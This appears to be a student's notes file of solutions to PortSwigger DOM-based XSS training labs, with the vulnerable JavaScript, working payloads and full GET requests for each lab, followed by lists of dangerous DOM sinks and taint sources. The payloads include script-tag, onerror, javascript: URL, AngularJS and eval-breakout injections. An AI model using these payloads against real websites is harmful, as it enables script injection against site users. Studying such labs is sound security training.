// 1
// Lab: DOM XSS in document.write sink using source location.search 
// https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink

// original Java script:
    function trackSearch(query) {
        document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
        trackSearch(query);
    }

// full path:
    GET /?search=">'<script>alert(document.domain)</script><"' HTTP/1.1

// payload:
    ">'<script>alert(document.domain)</script><"'


// #########



// 2
// Lab: DOM XSS in document.write sink using source location.search inside a select element
// https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element

// original Java script:

    var stores = ["London","Paris","Milan"];
    var store = (new URLSearchParams(window.location.search)).get('storeId');
    document.write('<select name="storeId">');
    if(store) {
        document.write('<option selected>'+store+'</option>');
    }
    for(var i=0;i<stores.length;i++) {
        if(stores[i] === store) {
            continue;
        }
        document.write('<option>'+stores[i]+'</option>');
    }
    document.write('</select>');

// payload:
<script>alert(1)</script>


// full path
GET /product?productId=3&storeId=<script>alert(1)</script> HTTP/1.1
// (i didnt close the tags - just wrote the script since it reflects as is anyway...)

// portswiggers solution: 
GET /product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)> HTTP/1.1



// 3
// Lab: DOM XSS in innerHTML sink using source location.search
// https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink


// original Java script:
function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    doSearchQuery(query);
}



// payload:
<img%20src=1%20onerror=alert(1)>

// full path:
GET /?search=<img%20src=1%20onerror=alert(1)> HTTP/1.



// 4.
// Lab: DOM XSS in jQuery anchor href attribute sink using location.search source
// https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink


// original script:
$(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
});


// payload:
?returnPath=javascript:alert(document.domain)

// full path:
GET /feedback?returnPath=javascript:alert(document.domain) HTTP/1.1


// 5.
// DOM XSS in jQuery selector sink using a hashchange event
// https:/portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event


// original script:

$(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post) post.get(0).scrollIntoView();
});



// payload:
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=print(1)>'">
<iframe src="https://ac201fda1fe56926c03d960700870032.web-security-academy.net#" onload="this.src+='<img src=1 onerror=alert(1)>'">
{/* to be stored on attacker server and deliverd as url */}





{/* 6. */}
{/* Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded */}
{/* https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression */}

{/* vulnerable code: */}
<body ng-app="" class="ng-scope">
    <input type="text" placeholder="Search the blog..." name="search">
  
{/* payload:                       */}
    {{$on.constructor('alert(1)')()}}
        
// full path:
GET /?search={{$on.constructor('alert(1)')()}} HTTP/1.1





// 7.
// DOM XSS combined with reflected and stored data
// https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected

original script:

function search(path) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            eval('var searchResultsObj = ' + this.responseText);
            displaySearchResults(searchResultsObj);
        }
    };
    xhr.open("GET", path + window.location.search);
    xhr.send();

// the vulnrable line:
    eval('var searchResultsObj = ' + this.responseText)

// payload:
\"-alert(1)}//


eval('var searchResultsObj = ' +  \"-alert(1)}//


HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 46

{"results":[],"searchTerm":" \\"-alert(1)}//




// 8.
// Stored DOM XSS
// https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored


payload:
<><img src=1 onerror=alert(1)>

// he website uses the JavaScript replace() function
// including an extra set of angle brackets at the beginning of the comment. These angle brackets will be encoded, but any subsequent angle brackets will be unaffected,






Portwsigger cheetsheet:
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet








Which sinks can lead to DOM-XSS vulnerabilities?

// The following are some of the main sinks that can lead to DOM-XSS vulnerabilities:
document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent

// The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:
add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()


// The following are typical sources that can be used to exploit a variety of taint-flow vulnerabilities:
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
document.cookie
document.referrer
window.name
history.pushState
history.replaceState
localStorage
sessionStorage
IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
Database

//

// DOM-based vulnerability 	Example sink
// DOM XSS LABS 	document.write()
// Open redirection LABS 	window.location
// Cookie manipulation LABS 	document.cookie
// JavaScript injection 	eval()
// Document-domain manipulation 	document.domain
// WebSocket-URL poisoning 	WebSocket()
// Link manipulation 	element.src
// Web message manipulation 	postMessage()
// Ajax request-header manipulation 	setRequestHeader()
// Local file-path manipulation 	FileReader.readAsText()
// Client-side SQL injection 	ExecuteSql()
// HTML5-storage manipulation 	sessionStorage.setItem()
// Client-side XPath injection 	document.evaluate()
// Client-side JSON injection 	JSON.parse()
// DOM-data manipulation 	element.setAttribute()
// Denial of service 	RegExp()
